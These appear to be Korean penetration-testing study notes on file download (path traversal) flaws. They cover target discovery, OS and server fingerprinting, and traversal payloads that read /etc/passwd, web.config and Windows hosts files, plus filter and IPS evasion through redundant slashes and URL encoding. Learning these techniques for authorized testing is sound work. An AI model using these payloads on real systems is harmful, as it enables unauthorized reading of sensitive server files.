--------------------------------------파일 다운로드 실습------------------------------------

한사이트에 보통 업로드경로는 한군데 있음
다운로드도 된다는 뜻

- 웹 브라우저에서 지원되는 파일 타입이 늘어남에 따라 URL 접근 시 출력.
그리고 업로드 경로가 웹 디렉터리가 아닐 경우 파일 다운로드 기능이 반드시 필요

- 기존 경로의 강제변조

* 파일 다운로드 로직 분류
 - 직접적 방식
 localhost/download.jsp?path=event&file=20201.png //경로랑 파일명 둘다 공격포인트가 될 수 있음 
 org_filename 다운로드 받을때
 
 real_filename 실제경로
 
 - 간접적 방식 
 localhost/download.jsp?idx=192
 
 
* JSP 다운로드 페이지
 1) 파일명 
 
 2) 일부경로 + 파일명
 
 3) 전체경로
 
* 모의해킹 관점에서 파일 다운로드 취약점 
 - Unix, Linux : ../
 - Windows : ../ ..\
 
* 취약점 분석 순서도
 1. 공격 대상 탐색
  - 일반적인 접근방법 : 공격자 -> 페이지 -> 다운로드 기능
                                 페이지 -> 게시판, CI(회사소개페이지), 다운로드, 이미지 뷰어
                                                  CI소개 : download.php?bo_table=download&wr_id=1
  - 직접적인 접근법 : 공격자 -> 다운로드 기능
                          HTML 코드, JS 코드, 유추, 구글링(site:www.test.co.kr inurl:download.jsp)
                          
 2. 환경 분석 : OS 파악, 언어파악
  1) 운영체제 파악
    #기존 존재파일
     http://www.victim.co.kr/js/common.js
    # 대/소문자 변경
      /js/coMMon.js -> Windows
      /JS/Common.js -> Linux / Unix
      /js/common.jS -> Linux / Unix
  2) 언어파악
    # 확장자(.do, .action은 JAVA기반), 응답 헤더, 에러페이지 -> 아파치서버, IIS서버, JEUS 서버, WebSphere 서버, TOMCAT서버(or Jboss서버 - 하단의 Jboss Web 구문 표기)
      
 3. 파일 다운로드 공격 : 다운로드 공격이 안되면 검증로직을 파악
  - download.aspx, file_download.aspx?file1=../../web.config&file2= //file1(org_filename), file2(real_filename)
    #리눅스 환경 : path=../../../etc&filename=passwd
    #윈도우 환경 : filename=../../index.jsp
                   path=d:/jeus/webhome/test_con/app/upload&filename=test.png
                   path=c:/windows/system32/drivers/etc&filename=hosts
                   
 4. 검증로직 파악 : 로직파악해서 공격 수행
  Linux/Unix : / ./ .. ../ 
  Windows : / \ ./ .\ .. ..\ ..\
  반응 분석은 문자 입력 시 에러 출력 혹은 치환(제거)되는지 확인
    
  응답 메시지
  "해당 파일이 존재하지 않습니다."
  "정상적인 입력 값이 아닙니다."
  "허용된 확장자가 아닙니다."
  
  ex)
  12/34.jpg -> /가 제거되는지 여부 확인
  ../../index.jsp -> ..//../index.jsp, ..////./././../index.jsp
  path=../&filename=../index.jsp
  ips에서는 URL인코딩하면 못잡음 -> %2f%2f%2findex.jsp
  
  
  
  
  
  
  
  
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
